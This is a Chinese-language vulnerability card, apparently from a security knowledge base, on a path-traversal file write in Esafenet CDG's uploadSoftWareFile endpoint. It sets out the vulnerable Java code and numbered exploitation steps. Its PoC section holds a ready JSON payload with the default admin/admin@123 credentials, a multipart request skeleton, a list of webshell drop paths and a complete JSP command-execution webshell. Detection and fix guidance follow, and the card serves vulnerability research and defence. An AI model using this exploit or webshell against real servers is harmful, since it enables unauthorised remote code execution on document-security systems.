---
id: web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell
title: 亿赛通 CDG uploadSoftWareFile 的 patch 参数未校验路径穿越写入 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: patch-param-path-traversal-arbitrary-file-write
aliases:
- 亿赛通 CDG 任意文件上传
- CDG uploadSoftWareFile 路径穿越
- FileController getDirPath patch 穿越
- ESAFENET CDocGuard Server RCE
tags:
- java
- esafenet
- cdg
- file-upload
- path-traversal
- arbitrary-file-write
- webshell
- default-credentials
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-42
  verified_at: '2026-11-05T06:41:27+08:00'
  notes: 已对照原文与17张截图核对：validateParameterForUpload 1175 解密 content、1179-1204 取 userName/pwd/loginName/patch/filePath/type；getUserName/getPassword 从 SQLite FileInfo 表按 md5 查询，默认 admin/admin@123（img/03/04/10）；ParamCheckUtil.checkFile 只检查 filePath 的 ../、..\（img/05），patch 未校验；getDirPath 用 basePath + separator + home 拼接并 getAbsolutePath（img/06），patch=../../ 时 dir 为 \data\files\..\..；uploadSoftWareFile 中 type==1 时 targetDir=getDirPath(patch)，filename=srcPath，targetfile=new File(targetDir, filename)，transferTo 写入（img/09）；调试 targetfile=D:\data\files\..\..\demo\aws\shell.jsp，Burp 200，解码响应 msg 成功 code 1（img/12/13）；访问 https://localhost:8443/CDGServer3/shell.jsp 读到 test（img/14）；不存在的目录返回 500/FileNotFoundException（img/15/16）；修复 getCanonicalPath().startsWith(baseDir)（img/17）均一致。说明：原文用内容为 test 的最小文件验证写入与 Web 可访问，未展示 JSP 命令执行回显，卡内已写明先 test 再换 WebShell。产品未给版本区间，未设 versions。未在本机复现。
---

## 一句话结论

亿赛通 CDG 文件服务器的 `POST /file/uploadSoftWareFile` 只校验了 JSON 里的 `filePath`，没有校验 `patch`；`patch` 被直接传入 `getDirPath()` 拼到 `basePath` 后取绝对路径，攻击者用 `../../` 把上传目录抬到盘符根，再用 `filePath` 指定 Tomcat `webapps/CDGServer3` 下的 `.jsp` 文件名，即可把上传内容写成 JSP WebShell 并访问执行；请求体用产品自带的 `CdgUtils.encodeContent` 加密，账号校验比对的是服务端 SQLite 中的默认值 `admin`/`admin@123`，默认部署即等于无需真实登录。

## 原理

问题代码位于 `FileController.java` 的 `uploadSoftWareFile`：

```java
String patch = jsonObject.getString("patch");     // 未参与任何校验
String srcPath = jsonObject.getString("filePath");

if (!ParamCheckUtil.checkFile(srcPath)) { ... }   // 只检查 filePath 的 ../、..\
...
if (type == 1) {
    ...
    if (null != patch && !"".equals(patch)) {
        targetDir = this.fileService.getDirPath(patch);   // 用户输入直接进入目录计算
    }
    String filename = srcPath;                            // 直接作为文件名
    targetfile = new File(targetDir, filename);
    file.transferTo(targetfile);                          // 任意文件写入
}
```

两处缺陷叠加：

1. **patch 未校验**：`ParamCheckUtil.checkFile()` 只作用在 `filePath` 上（对 `../`、`..\` 有检测，原文确认单靠 `filePath` 无法穿越），但 `patch` 被漏掉。`FileServiceImpl.getDirPath(patch)` 的实现是先修 `new File(basePath + File.separator + patch)`，再 `getAbsolutePath()`。默认 `basePath=/data/files`，`patch=../../` 时返回 `D:\data\files\..\..`（原文调试截图），即 `D:\`，从而把“可写根”抬到盘符根。
2. **filePath 未规范化**：`new File(targetDir, filename)` 直接拼接，不做 canonical 化。Windows 下 `filePath` 以 `/Program Files/...` 开头时没有盘符，Java 会把它当作相对路径处理，最终 `targetfile` 形如 `D:\data\files\..\..\Program Files (x86)\ESAFENET\...\webapps\CDGServer3\shell.jsp`，`file.transferTo()` 直接把上传内容写到位。

认证面也基本不构成阻碍：请求头 `content` 是 `CdgUtils.decodeContent()` 解出的 JSON；`validateParameterForUpload()` 用 `fileService.getUserName()` / `getPassword()` 从 SQLite 取服务端自身的用户名和密码，再与请求 JSON 中的 `userName`/`pwd` 比较。默认值就是 `admin` / `admin@123`，所以知道默认值即可通过，并不是真正的会话或权限校验。

写入成功后，文件落在 Tomcat `webapps/CDGServer3/` 下，`.jsp` 由容器直接解析，形成 RCE。

## 触发条件

- 目标为存在 `uploadSoftWareFile` 接口的亿赛通 CDG 文件服务器。
- 能访问 `/file/uploadSoftWareFile`，并可构造产品要求的 `content` 头（`CdgUtils.encodeContent` 加密的 JSON）。
- 服务端仍使用默认凭据 `admin` / `admin@123`（或攻击者已知/猜中实际凭据）。
- 进程对目标目录（如 `D:\` 到 Tomcat `webapps` 的路径、或 Linux 下的对应目录）有写权限。
- 已知 Tomcat 安装路径；不存在的目录会报错，可据此判断写入是否成功。

## 利用步骤

1. 准备 JSP WebShell，作为 multipart 的 `file` 部分上传（文件名本身不决定落盘名，落盘名由 JSON 的 `filePath` 决定）。
2. 构造 JSON：`type=1`，`patch` 设为 `../../`，`filePath` 设为默认安装路径下 `.../tomcat/webapps/CDGServer3/shell.jsp`（或 `tomcat64`、`Program Files`、`ESAFENET` 等变体）；`userName`、`pwd` 填默认值。
3. 用产品的 `CdgUtils.encodeContent()` 对 JSON 加密，作为 HTTP 头 `content` 的值。
4. `POST /file/uploadSoftWareFile`，multipart 上传 WebShell 文件。
5. 访问 `https://target:8443/CDGServer3/shell.jsp`（或对应 HTTP 端口）确认落盘并可执行。
6. 若返回 500 且异常为 `FileNotFoundException`，说明目录/路径不对；换安装路径变体重试。

## PoC

JSON（原文使用）：

```json
{
  "patch": "../../",
  "filePath": "/Program Files (x86)/ESAFENET/CDocGuard Server/tomcat/webapps/CDGServer3/shell.jsp",
  "userName": "admin",
  "pwd": "admin@123",
  "loginName": "testuser",
  "timestamp": 1704067200,
  "type": 1,
  "totalSize": 1024,
  "md5": "11765C012DF192553919A2E0043357D3"
}
```

请求骨架：

```http
POST /file/uploadSoftWareFile HTTP/1.1
Host: target:8021
content: <CdgUtils.encodeContent(上面的 JSON)>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: application/octet-stream

<JSP WebShell 内容>
------boundary--
```

窗口常见落盘路径变体：

```text
/Program Files (x86)/ESAFENET/CDocGuard Server/tomcat/webapps/CDGServer3/shell.jsp
/Program Files (x86)/ESAFENET/CDocGuard Server/tomcat64/webapps/CDGServer3/shell.jsp
/Program Files/ESAFENET/CDocGuard Server/tomcat/webapps/CDGServer3/shell.jsp
/Program Files/ESAFENET/CDocGuard Server/tomcat64/webapps/CDGServer3/shell.jsp
/ESAFENET/CDocGuard Server/tomcat/webapps/CDGServer3/shell.jsp
/ESAFENET/CDocGuard Server/tomcat64/webapps/CDGServer3/shell.jsp
```

原文验证结果：调试中 `targetfile` 为 `D:\data\files\..\..\demo\aws\shell.jsp`；响应 200 且解码后返回 `{"msg":"成功","code":1,...}`；访问 `https://localhost:8443/CDGServer3/shell.jsp` 读到了上传内容。最小验证可用内容为 `test` 的文件先确认写入，再换 WebShell。

JSP WebShell 最小示例（原文）：

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line + "<br>");
}
%>
```

## 变体与关联

- Windows 变体：`patch=../../` 把基目录抬到盘符根，`filePath` 按 Tomcat 安装路径选择 `tomcat` / `tomcat64`、`Program Files` / `Program Files (x86)`。
- Linux 变体：默认 `basePath` 为 `/data/files`，用 `patch` 上调后把文件写入 Tomcat `webapps` 对应目录。
- 写入前可先用不存在的目录试探：接口返回 500 和 `FileNotFoundException`，可区分“路径不存在”与“权限/校验失败”。
- 关联：[[web-generic-file-upload-ueditor-filepathformat-traversal]]（同为“路径参数模板/拼接未校验”导致任意目录写入）；[[web-generic-file-upload-weak-suffix-bypass]]（上传名/后缀校验缺失的通用形态）；[[web-java-component-onlyoffice-storage-key-path-traversal-file-write]]（Java 组件中 key 未规范化导致任意文件写）。
- 与纯“后缀黑名单绕过”不同，本场景的根因是目录参数 `patch` 未被纳入校验，后缀不是障碍；即使 `filePath` 自身检测 `../` 也无法阻止。

## 检测与防御

- 检测：`POST /file/uploadSoftWareFile` 请求头 `content` 为密文、JSON 解码后 `patch` 含 `../`/`..\`、`filePath` 指向 `webapps` 或包含 `.jsp`；同一来源短时间多次尝试不同安装路径。
- 检测：Web 目录下出现新增 `.jsp`/`.jspx` 文件；上传目录与 Web 根目录存在交叉；`runtime` 日志出现 `getDirPath` 相关异常或 `FileNotFoundException`。
- 防御（根修）：写入前用 `targetfile.getCanonicalPath().startsWith(baseDir)` 校验，原文修复即采用该写法；同时把 `patch` 纳入参数白名单，只允许已知的补丁子目录。
- 防御：对 `filePath` 做规范化并强制只取 basename，禁止绝对路径、盘符和 `..`；上传目录与 Web 根分离，上传内容不可执行。
- 防御：删除/强制修改默认凭据 `admin`/`admin@123`，改用真实认证；`content` 加密不能当作安全边界（算法与调用方均在产品内）。
- 加固：Tomcat 上传目录禁止脚本解析；最小权限运行；对上传接口做来源与频率限制。
